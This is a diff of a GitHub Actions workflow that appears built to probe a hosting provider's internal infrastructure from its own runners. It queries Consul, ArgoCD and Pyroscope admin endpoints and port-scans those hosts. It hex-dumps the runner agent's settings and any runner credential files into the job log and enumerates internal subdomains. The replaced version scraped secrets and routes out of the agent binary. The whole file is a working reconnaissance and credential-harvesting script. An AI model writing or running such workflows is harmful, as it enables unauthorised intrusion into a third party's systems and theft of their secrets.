@@ -1,44 +1,63 @@
-name: Consul and Binary Deep
+name: Internal Services Scan
 on:
   workflow_dispatch:
 jobs:
   scan:
     runs-on: ubuntu-latest
     steps:
-      - name: Consul and binary analysis
+      - name: Probe internal services
         timeout-minutes: 8
         run: |
           set +e
-          echo "=== CONSUL SERVICE ==="
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/ 2>&1 | head -20
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/agent/self 2>&1 | head -10
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/catalog/services 2>&1 | head -20
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/catalog/nodes 2>&1 | head -20
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/kv/?recurse 2>&1 | head -20
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/status/leader 2>&1
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/v1/status/peers 2>&1
-          curl -sk --connect-timeout 5 https://consul.githubapp.com/ui/ 2>&1 | head -10
+          echo "=== PYROSCOPE ==="
+          for path in / /healthz /ready /api/v1/apps /api/v1/labels /api/v1/label-values /render /config; do
+            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://pyroscope.githubapp.com$path" 2>&1)
+            [ "$CODE" != "000" ] && echo "pyroscope$path [$CODE]: $(head -c 300 /tmp/resp)"
+          done
           echo ""
-          echo "=== CONSUL HTTP (port 8500) ==="
-          curl -sk --connect-timeout 3 http://consul.githubapp.com:8500/v1/catalog/services 2>&1 | head -10
-          curl -sk --connect-timeout 3 http://140.82.113.23:8500/v1/catalog/services 2>&1 | head -10
+          echo "=== ARGOCD ==="
+          for path in / /healthz /api/v1/applications /api/v1/clusters /api/v1/repositories /api/v1/session /api/v1/settings /api/version; do
+            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://argocd.githubapp.com$path" 2>&1)
+            [ "$CODE" != "000" ] && echo "argocd$path [$CODE]: $(head -c 300 /tmp/resp)"
+          done
           echo ""
-          echo "=== HCA BINARY DEEP STRINGS ==="
-          strings /opt/hca/hosted-compute-agent | grep -iE 'consul|vault|nomad|etcd|redis|postgres|mysql|mongo|elastic|rabbit|kafka|nats' | sort -u | head -20
+          echo "=== CONSUL ==="
+          for path in / /v1/agent/self /v1/catalog/services /v1/catalog/nodes /v1/kv/ /v1/status/leader /ui/; do
+            CODE=$(curl -sk --connect-timeout 3 -o /tmp/resp -w "%{http_code}" "https://consul.githubapp.com$path" 2>&1)
+            [ "$CODE" != "000" ] && echo "consul$path [$CODE]: $(head -c 300 /tmp/resp)"
+          done
           echo ""
-          echo "=== HCA BINARY CONFIG STRINGS ==="
-          strings /opt/hca/hosted-compute-agent | grep -iE 'config|setting|env|secret|credential|password|apikey|endpoint|url.*=' | sort -u | head -30
+          echo "=== ALL DISCOVERED SERVICES DEEP ==="
+          for host in consul.githubapp.com pyroscope.githubapp.com argocd.githubapp.com; do
+            echo "--- $host ports ---"
+            for port in 80 443 8080 8443 8500 8300 8301 8302 9090 3000 4040 4100 6443 8081 8082 9411; do
+              timeout 1 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && echo "$host:$port OPEN"
+            done
+          done
           echo ""
-          echo "=== HCA BINARY ERROR MESSAGES ==="
-          strings /opt/hca/hosted-compute-agent | grep -iE 'error.*auth|error.*token|error.*attest|failed.*auth|failed.*token|invalid.*token|unsupported.*attest' | sort -u | head -20
+          echo "=== CONFIGMAP ==="
+          ls -laR /mnt/configmap/ 2>/dev/null || echo no configmap
+          find /mnt/ -type f 2>/dev/null | head -20
           echo ""
-          echo "=== HCA BINARY HTTP ROUTES ==="
-          strings /opt/hca/hosted-compute-agent | grep -E '^/v[0-9]|^/api/|^/vm/|^/health|^/status|^/register|^/heartbeat|^/complete|^/cancel|^/trace|^/logs' | sort -u | head -30
+          echo "=== HCA .settings FULL RAW ==="
+          xxd /opt/hca/.settings 2>/dev/null | head -40
           echo ""
-          echo "=== HCA BINARY FUNCTION NAMES ==="
-          strings /opt/hca/hosted-compute-agent | grep -E 'github.com/github/hosted-compute' | sort -u | head -40
+          echo "=== HCA DIAGNOSTICS.JSON ==="
+          xxd /opt/hca/diagnostics.json 2>/dev/null | head -20
           echo ""
-          echo "=== OTHER GITHUBAPP SUBDOMAINS ==="
-          for sub in consul vault nomad etcd redis kafka nats rabbitmq elasticsearch kibana grafana prometheus alertmanager jaeger zipkin loki tempo mimir pyroscope parca thanos cortex kiali argocd drone concourse buildkite render copilot actions cache artifacts runner codespace spark compute; do IP=$(dig +short $sub.githubapp.com 2>/dev/null | tail -1); [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP"; done
+          echo "=== RUNNER .credentials RAW ==="
+          find /home/runner -name .credentials 2>/dev/null | while read f; do echo $f; xxd $f 2>/dev/null | head -20; done
+          echo ""
+          echo "=== MORE GITHUBAPP SUBDOMAINS ==="
+          for sub in actions-broker actions-token actions-cache-prod actions-results-prod runner-provisioner-prod codespace-provisioner-prod hosted-compute-watchdog-prod hosted-compute-primer-prod observability telemetry analytics metrics sentry datadog newrelic splunk pagerduty opsgenie statuspage; do
+            IP=$(dig +short "$sub.githubapp.com" 2>/dev/null | tail -1)
+            [ -n "$IP" ] && echo "$sub.githubapp.com -> $IP"
+          done
+          echo ""
+          echo "=== GITHUB.NET SUBDOMAINS ==="
+          for sub in admin api internal vpn ssh git lb proxy cache cdn compute runner actions copilot spark; do
+            IP=$(dig +short "$sub.github.net" 2>/dev/null | tail -1)
+            [ -n "$IP" ] && echo "$sub.github.net -> $IP"
+          done
           echo ""
           echo "=== DONE ==="
